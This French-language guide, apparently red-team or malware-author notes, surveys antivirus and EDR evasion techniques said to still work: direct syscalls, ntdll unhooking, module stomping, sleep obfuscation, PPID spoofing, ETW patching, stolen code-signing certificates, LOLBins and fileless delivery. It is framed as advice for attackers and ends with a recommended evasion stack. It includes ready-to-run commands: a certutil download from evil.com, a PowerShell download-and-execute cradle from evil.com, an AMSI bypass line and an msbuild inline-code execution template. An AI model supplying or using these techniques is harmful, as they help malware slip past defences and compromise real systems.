# Guide Évasion Moderne - Ce qui marche encore en 2024+

## Table des matières
1. [Évolution de la détection](#évolution-de-la-détection)
2. [Ce qui ne marche PLUS](#ce-qui-ne-marche-plus)
3. [Ce qui marche ENCORE](#ce-qui-marche-encore)
4. [Techniques modernes](#techniques-modernes)
5. [Living Off The Land (LOLBins)](#living-off-the-land-lolbins)
6. [Fileless attacks](#fileless-attacks)
7. [Recommandations](#recommandations)

---

## Évolution de la détection

### Timeline des AV/EDR

```
┌─────────────────────────────────────────────────────────────┐
│                  ÉVOLUTION DE LA DÉTECTION                  │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  1990s-2000s: SIGNATURES                                    │
│  ─────────────────────────                                  │
│  - Hash du fichier                                          │
│  - Patterns d'octets                                        │
│  - Bypass: changer 1 byte = nouvel hash                     │
│                                                              │
│  2005-2015: HEURISTIQUE                                     │
│  ───────────────────────                                    │
│  - Analyse des imports (APIs suspectes)                     │
│  - Structure du PE                                          │
│  - Bypass: packing, obfuscation                             │
│                                                              │
│  2015-2020: COMPORTEMENTAL + SANDBOX                        │
│  ─────────────────────────────────────                      │
│  - Exécution dans VM                                        │
│  - Surveillance des actions                                 │
│  - Bypass: anti-sandbox, délai d'exécution                  │
│                                                              │
│  2020+: ML/IA + EDR + CLOUD                                 │
│  ──────────────────────────                                 │
│  - Machine learning sur millions d'échantillons             │
│  - Télémétrie temps réel                                    │
│  - Analyse comportementale avancée                          │
│  - Bypass: ??? (c'est le défi actuel)                       │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## Ce qui ne marche PLUS

### ❌ Packing/Compression classique

```
┌─────────────────────────────────────────────────────────────┐
│                POURQUOI LE PACKING EST MORT                 │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  PROBLÈME 1: Entropy élevée                                 │
│  ─────────────────────────────                              │
│  Fichier normal: entropy ~5-6                               │
│  Fichier packé:  entropy ~7.5-8                             │
│  → L'IA flag automatiquement les hautes entropies           │
│                                                              │
│  PROBLÈME 2: Signatures de packers                          │
│  ───────────────────────────────────                        │
│  UPX, Themida, VMProtect = signatures connues               │
│  → Fichier packé = suspect par défaut                       │
│                                                              │
│  PROBLÈME 3: Unpacking automatique                          │
│  ─────────────────────────────────                          │
│  Les sandbox attendent le dépack                            │
│  Puis analysent le code original                            │
│                                                              │
│  PROBLÈME 4: Indicateur de malveillance                     │
│  ───────────────────────────────────────                    │
│  Logiciels légitimes = rarement packés                      │
│  Packer = "j'ai quelque chose à cacher"                     │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### ❌ Obfuscation basique

| Technique | Pourquoi ça ne marche plus |
|-----------|---------------------------|
| **XOR simple** | Patterns détectables, ML les voit |
| **Base64** | Trivial à décoder automatiquement |
| **String concat** | Reconstruction par analyse |
| **Dead code** | Analyseurs enlèvent le junk |

### ❌ Anti-debug classique

```
Les AV/EDR connaissent TOUTES ces techniques:
- IsDebuggerPresent     → Hookent et retournent FALSE
- PEB.BeingDebugged     → Patchent le PEB
- Timing checks         → Émulent le timing
- RDTSC                 → Virtualisent l'instruction
```

### ❌ Anti-VM classique

```
Les sandbox modernes:
- Masquent les artifacts VMware/VirtualBox
- Simulent plusieurs CPUs et beaucoup de RAM
- Émulent l'interaction utilisateur (mouvement souris)
- Font les analyses pendant plusieurs minutes
```

---

## Ce qui marche ENCORE

### ✅ Syscalls directs

```
┌─────────────────────────────────────────────────────────────┐
│                      SYSCALLS DIRECTS                       │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Le problème: les EDR hookent ntdll.dll                     │
│                                                              │
│  Normal:                                                    │
│  VirtualAlloc() → kernel32 → ntdll (HOOKED) → kernel        │
│                                                              │
│  Syscall direct:                                            │
│  VirtualAlloc() → syscall direct → kernel                   │
│  (bypass le hook ntdll)                                     │
│                                                              │
│  Techniques:                                                │
│  - Hell's Gate (lit les syscall numbers depuis ntdll)       │
│  - Halo's Gate (gère les ntdll hookées)                     │
│  - Syswhispers (génère les stubs syscall)                   │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### ✅ Unhooking

```c
// Restaurer ntdll original depuis le fichier sur disque
// 1. Mapper ntdll.dll depuis C:\Windows\System32\ntdll.dll
// 2. Copier la section .text propre sur l'actuelle
// 3. Les hooks sont supprimés
```

### ✅ Module Stomping / Overloading

```
Au lieu de: VirtualAlloc + écrire shellcode

Faire:
1. Charger une DLL légitime (ex: amsi.dll)
2. Écrire ton code PAR-DESSUS son code
3. Exécuter

→ La mémoire "appartient" à une DLL légitime
→ Moins suspect pour l'EDR
```

### ✅ Callback-based execution

```
Au lieu de: CreateThread → adresse suspecte (détecté)

Faire: Utiliser des callbacks système
- EnumWindows(callback, ...)
- EnumFonts(callback, ...)
- CertEnumSystemStore(callback, ...)

→ Le thread démarre depuis du code Windows légitime
→ Moins détectable
```

---

## Techniques modernes

### 1. Code Signing

```
┌─────────────────────────────────────────────────────────────┐
│                      SIGNATURE DE CODE                      │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Fichier signé = confiance accrue                           │
│                                                              │
│  Options:                                                   │
│  1. Acheter un certificat EV ($400-1000/an)                 │
│  2. Utiliser un certificat volé (risqué, révoqué vite)      │
│  3. Abuser de certificats compromis                         │
│                                                              │
│  Impact:                                                    │
│  - Score de réputation plus élevé                           │
│  - Moins d'alertes SmartScreen                              │
│  - Whitelisting automatique sur certains EDR               │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### 2. Timestomping metadata

```
Modifier les métadonnées pour ressembler à un soft légitime:
- Nom de l'entreprise: "Microsoft Corporation"
- Description: "Windows Service Host"
- Version: match avec l'OS
- Date de compilation: vieille date
```

### 3. Polymorphisme à la compilation

```
┌─────────────────────────────────────────────────────────────┐
│                        POLYMORPHISME                        │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Chaque build = binaire unique                              │
│                                                              │
│  Techniques:                                                │
│  - Clés de chiffrement random                              │
│  - Ordre des fonctions random                              │
│  - Noms de variables random                                │
│  - Junk code différent                                     │
│  - Métadonnées différentes                                 │
│                                                              │
│  Résultat:                                                  │
│  Build #1: hash abc123...                                  │
│  Build #2: hash def456...  (même code, hash différent)     │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### 4. Sleep obfuscation

```
Le problème: pendant que l'agent dort, son shellcode est en mémoire
→ Les memory scanners peuvent le trouver

Solution: chiffrer le shellcode pendant le sleep

while (running) {
    encrypt_memory(shellcode, key);   // Mémoire chiffrée
    Sleep(beacon_interval);            // EDR scanne = rien
    decrypt_memory(shellcode, key);   // Déchiffre
    do_beacon();                       // Exécute rapidement
}
```

### 5. PPID Spoofing

```
Le problème: 
malware.exe ← parent: explorer.exe = normal
malware.exe ← parent: word.exe = suspect

Solution: Spoofer le parent PID
→ Faire croire que le process a été lancé par explorer.exe
```

### 6. ETW Patching

```
ETW = Event Tracing for Windows
→ Les EDR l'utilisent pour voir les events

Solution: Patcher EtwEventWrite pour ne rien logger
→ L'EDR ne voit plus tes actions
```

---

## Living Off The Land (LOLBins)

### Concept

```
┌─────────────────────────────────────────────────────────────┐
│                           LOLBins                           │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Au lieu d'utiliser ton propre code...                      │
│  Utilise les outils déjà présents sur Windows !            │
│                                                              │
│  Avantages:                                                 │
│  - Pas de fichier malveillant sur disque                   │
│  - Signé Microsoft = confiance                             │
│  - Déjà whitelisté                                         │
│  - Difficile à bloquer (casse des apps légitimes)          │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Exemples populaires

| LOLBin | Usage |
|--------|-------|
| **powershell** | Exécuter du code, download |
| **mshta** | Exécuter HTA/VBS |
| **msbuild** | Compiler et exécuter C# inline |
| **regsvr32** | Charger des scriptlets |
| **rundll32** | Exécuter des DLLs |
| **certutil** | Download de fichiers |
| **bitsadmin** | Download de fichiers |
| **wmic** | Exécution de commandes |

### Exemple: Download avec certutil

```cmd
# Download un fichier
certutil -urlcache -split -f http://evil.com/payload.exe C:\Temp\legit.exe

# Encode/Decode base64
certutil -encode payload.exe payload.b64
certutil -decode payload.b64 payload.exe
```

### Exemple: Exécuter C# avec msbuild

```xml
<!-- build.csproj -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Build">
    <ClassExample />
  </Target>
  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" 
             AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
          using System;
          using Microsoft.Build.Utilities;
          public class ClassExample : Task {
            public override bool Execute() {
              System.Diagnostics.Process.Start("calc.exe");
              return true;
            }
          }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe build.csproj
```

---

## Fileless attacks

### Concept

```
┌─────────────────────────────────────────────────────────────┐
│                      FILELESS ATTACKS                       │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Aucun fichier malveillant sur le disque                    │
│  Tout s'exécute EN MÉMOIRE                                  │
│                                                              │
│  Stage 1: Dropper léger (ou macro, ou LOLBin)              │
│     │                                                        │
│     ▼                                                        │
│  Stage 2: Download payload en mémoire                       │
│     │                                                        │
│     ▼                                                        │
│  Stage 3: Exécution en mémoire (jamais sur disque)         │
│                                                              │
│  Le disque est propre → Forensics plus difficile            │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Techniques

| Technique | Description |
|-----------|-------------|
| **PowerShell IEX** | `IEX (New-Object Net.WebClient).DownloadString('http://...')` |
| **Reflective DLL** | DLL qui se charge elle-même en mémoire |
| **Process Injection** | Injecter dans un process existant |
| **Registry storage** | Stocker payload dans la registry |
| **.NET Assembly.Load** | Charger un .NET assembly depuis bytes |

### Exemple: PowerShell fileless

```powershell
# Download et exécute en mémoire (rien sur disque)
IEX (New-Object System.Net.WebClient).DownloadString('http://evil.com/payload.ps1')

# Ou avec encodage base64
powershell -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAuAC4ALgA=

# Bypass AMSI (classique, souvent bloqué maintenant)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

---

## Recommandations

### Stack moderne recommandé

```
┌─────────────────────────────────────────────────────────────┐
│                   STACK ÉVASION 2024+                       │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  COMPILATION                                                │
│  ───────────                                                │
│  ✅ Code source fresh (pas de packer)                       │
│  ✅ Entropy normale (~5-6)                                  │
│  ✅ Métadonnées légitimes                                   │
│  ✅ Certificat de signature si possible                     │
│  ✅ Polymorphisme (chaque build unique)                     │
│                                                              │
│  EXÉCUTION                                                  │
│  ─────────                                                  │
│  ✅ Syscalls directs (bypass hooks)                         │
│  ✅ Unhooking ntdll si besoin                               │
│  ✅ Callback execution (pas CreateThread)                   │
│  ✅ Sleep obfuscation                                       │
│  ✅ ETW patching                                            │
│                                                              │
│  LIVRAISON                                                  │
│  ─────────                                                  │
│  ✅ LOLBins quand possible                                  │
│  ✅ Fileless si possible                                    │
│  ✅ Staged delivery (petit stager → gros payload)          │
│                                                              │
│  PERSISTENCE                                                │
│  ───────────                                                │
│  ✅ Techniques discrètes (COM hijack, etc.)                 │
│  ✅ Éviter les classiques (Run keys, services)             │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Ce qu'il faut retenir

| Approche | Commentaire |
|----------|-------------|
| ❌ "Je cache mon code" | L'IA le trouve quand même |
| ✅ "Je ressemble à du code légitime" | Blend in, don't stand out |
| ❌ "J'utilise plein de tricks" | Plus de tricks = plus suspect |
| ✅ "Je fais le minimum nécessaire" | Simple et efficace |
| ❌ "Je pack/compress tout" | Indicateur de malveillance |
| ✅ "Je compile depuis source" | Entropy normale, fresh build |

---

## Ressources

- **LOLBAS Project**: https://lolbas-project.github.io/
- **GTFOBins** (Linux): https://gtfobins.github.io/
- **Red Team Notes**: https://www.ired.team/
- **Elastic Detection Rules**: https://github.com/elastic/detection-rules
- **Atomic Red Team**: https://github.com/redcanaryco/atomic-red-team
